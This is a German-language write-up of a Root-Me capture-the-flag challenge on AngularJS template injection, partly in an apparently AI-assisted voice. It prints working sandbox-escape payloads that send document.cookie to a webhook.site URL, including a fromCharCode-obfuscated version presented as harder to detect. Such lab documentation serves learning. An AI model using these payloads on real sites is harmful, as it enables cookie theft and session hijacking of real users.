---
created:
  - "{{date: DD-MM-YYYY}} {{time}}"
aliases:
  - "Course Code:"
tags:
  - Course/
---
# Root-Me XSS Dokumentation



## 🧩 Challenge-Ziel

**Ziel:** Die Session-Cookies des Admin-Bots stehlen, indem eine AngularJS Template Injection ausgenutzt wird, um den Admin auf eine eigene Webhook-URL umzuleiten.​

---

## ❌ Was nicht funktioniert hat

### 1. **Direkte Nutzung von `document.cookie`**

- **Versuch:** Einfache Payloads wie:

```Javascript
{{constructor.constructor('document.location="https://webhook.site/617db51b-f86d-4a0b-9234-193fadfd4ce4?c="+document.cookie')()}}
```

und umgewandelt in:

```
http://challenge01.root-me.org/web-client/ch35/index.php?name=%7B%7B%27a%27.constructor.prototype.charAt.constructor%28%27location%3D%22https%3A%2F%2Fwebhook.site%2F617db51b-f86d-4a0b-9234-193fadfd4ce4%3Fc%3D%22%2Bdocument.cookie%27%29%28%29%7D%7D
```

- **Ergebnis:** Keine Fehlermeldung, aber es wurden keine Cookies an den Webhook gesendet.
    
- **Grund:** Die Session-Cookies sind mit dem `HttpOnly`-Flag versehen, wodurch sie für JavaScript nicht zugänglich sind.​
    

### 2. **Selbsttest im eigenen Browser**

- **Versuch:** Den Payload im eigenen Browser ausführen.
    
- **Ergebnis:** Keine Cookies wurden an den Webhook gesendet.
- **Grund:** Moderne Browser schützen `HttpOnly`-Cookies vor JavaScript-Zugriff, selbst wenn der Payload korrekt ist.​

---

## ✅ Was funktioniert hat

### 1. **Verwendung von `fromCharCode` zur Umgehung von Filtern**

### ✨ Schritt 1: Deinen String in ASCII-Codes umwandeln

Der umzuwandelnde String:

`location.href='https://webhook.site/617db51b-f86d-4a0b-9234-193fadfd4ce4?c='+document.cookie`

---

Hier dein fertiges **fromCharCode()-Array**:
```javascript
108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,54,49,55,100,98,53,49,98,45,102,56,54,100,45,52,97,48,98,45,57,50,51,52,45,49,57,51,102,97,100,102,100,52,99,101,52,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101
```

---

### 📦  fertiger Payload:

```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,54,49,55,100,98,53,49,98,45,102,56,54,100,45,52,97,48,98,45,57,50,51,52,45,49,57,51,102,97,100,102,100,52,99,101,52,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))()}}
```

---

### ✅ Komplett fertige URL zum Absenden (für dein Contact-Formular):

**NICHT ENCODED:**

```
http://challenge01.root-me.org/web-client/ch35/?name={{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,54,49,55,100,98,53,49,98,45,102,56,54,100,45,52,97,48,98,45,57,50,51,52,45,49,57,51,102,97,100,102,100,52,99,101,52,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))()}}
```

---

### 📣 Wichtig:

✅  Webhook `https://webhook.site/617db51b-f86d-4a0b-9234-193fadfd4ce4` wird angesprochen.

✅ `?c=` wird ans Ende gehängt, damit dein Cookie auch ankommt.

✅ Verschleierung über `fromCharCode`, damit der Adminbot es schwerer hat, den Angriff zu erkennen.

### 🛡️ Sicherheitsmechanismen in AngularJS

**1. AngularJS-Sandbox**

AngularJS verwendet eine Sandbox, um den Zugriff auf gefährliche Objekte wie `window` oder `document` innerhalb von Template-Ausdrücken zu verhindern. Diese Sandbox prüft Ausdrücke und blockiert solche, die potenziell schädlich sein könnten. Allerdings wurden im Laufe der Zeit mehrere Methoden entdeckt, um diese Sandbox zu umgehen, insbesondere in älteren AngularJS-Versionen. ​[portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection?utm_source=chatgpt.com)

**2. Eingebaute XSS-Schutzmechanismen**

AngularJS bietet standardmäßig Schutzmechanismen gegen XSS-Angriffe. Dazu gehört die automatische Escapierung von Daten, die in Templates eingebunden werden. Allerdings können bestimmte Konstruktionen, wie z.B. die direkte Verwendung von `innerHTML` oder die Nutzung von `bypassSecurityTrustHtml()`, diese Schutzmechanismen umgehen. ​[pragmaticwebsecurity.com+1Angular+1](https://pragmaticwebsecurity.com/articles/spasecurity/angular-xss?utm_source=chatgpt.com)

### 🔍 Umgehung der Sicherheitsmechanismen

Um die Sicherheitsmechanismen zu umgehen, wurde eine Payload verwendet, die den `fromCharCode`-Ansatz nutzt, um den schädlichen Code zu verschleiern. Dies hilft, einfache Filter zu umgehen, die bestimmte Zeichen oder Wörter blockieren könnten.

### 📌 Fazit

Die Sicherheitsmechanismen in AngularJS, wie die Sandbox und automatische Escapierung, bieten einen gewissen Schutz gegen XSS-Angriffe. Allerdings können sie durch bestimmte Techniken umgangen werden, insbesondere in älteren Versionen oder bei unsachgemäßer Verwendung von AngularJS-Funktionen. Es ist daher wichtig, stets die neuesten Sicherheitspraktiken zu befolgen und Anwendungen regelmäßig auf Schwachstellen zu überprüfen.​

Wenn du weitere Informationen oder eine detailliertere Analyse benötigst, stehe ich gerne zur Verfügung.